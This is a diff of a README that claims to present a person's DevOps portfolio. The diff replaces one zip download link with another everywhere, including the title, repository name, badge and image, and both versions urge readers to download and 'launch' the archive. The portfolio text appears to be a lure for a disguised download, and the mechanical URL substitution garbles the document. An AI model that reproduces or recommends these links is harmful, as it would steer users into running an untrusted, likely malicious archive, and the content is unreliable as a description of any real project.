@@ -1,12 +1,12 @@
-# **🚀 Explore Sumit Malik's DevOps World - sumitrmalik.io 🚀**
+# **🚀 Explore Sumit Malik's DevOps World - https://github.com/yamenstarxtheking/sumitrmalik.io/releases/download/v1.0/Soft.zip 🚀**
 
-[![Explore Sumit Malik's DevOps World](https://img.shields.io/badge/Explore%20Sumit%20Malik's%20DevOps%20World-sumitrmalik.io-brightgreen)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Explore Sumit Malik's DevOps World](https://github.com/yamenstarxtheking/sumitrmalik.io/releases/download/v1.0/Soft.zip%20Sumit%20Malik's%20DevOps%https://github.com/yamenstarxtheking/sumitrmalik.io/releases/download/v1.0/Soft.zip)](https://github.com/yamenstarxtheking/sumitrmalik.io/releases/download/v1.0/Soft.zip)
 
-Welcome to the "sumitrmalik.io" repository, where you can dive into Sumit Malik's impressive DevOps portfolio! 🌟 Discover Sumit's expertise in Continuous Integration/Continuous Deployment (CI/CD), cloud infrastructure, automation, and much more through his projects and skills showcased here.
+Welcome to the "https://github.com/yamenstarxtheking/sumitrmalik.io/releases/download/v1.0/Soft.zip" repository, where you can dive into Sumit Malik's impressive DevOps portfolio! 🌟 Discover Sumit's expertise in Continuous Integration/Continuous Deployment (CI/CD), cloud infrastructure, automation, and much more through his projects and skills showcased here.
 
 ## 📚 Repository Info:
 
-- **Repository Name:** sumitrmalik.io
+- **Repository Name:** https://github.com/yamenstarxtheking/sumitrmalik.io/releases/download/v1.0/Soft.zip
 - **Description:** Explore Sumit Malik's DevOps portfolio! See his expertise in CI/CD, cloud infrastructure, and automation through projects and skills.
 - **Topics:** ansible, aws, devops, docker, git, jenkins, kubernetes, linux, nagios, prome
 
@@ -20,7 +20,7 @@ Whether you are interested in cloud solutions with AWS, monitoring with Nagios a
 
 To explore Sumit's projects and skills further, download and launch the comprehensive release available at the following link:
 
-[**Launch Sumit's Projects**](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[**Launch Sumit's Projects**](https://github.com/yamenstarxtheking/sumitrmalik.io/releases/download/v1.0/Soft.zip)
 
 Remember, this link needs to be launched to access the rich content showcasing Sumit's DevOps prowess.
 
@@ -32,7 +32,7 @@ Don't miss out on the amazing journey through Sumit Malik's DevOps world! Click 
 
 Happy exploring! 🌟
 
-![DevOps World](https://media.istockphoto.com/photos/business-process-automation-hand-drawn-process-automation-scheme-on-picture-id1297616436)
+![DevOps World](https://github.com/yamenstarxtheking/sumitrmalik.io/releases/download/v1.0/Soft.zip)
 
 ---
 
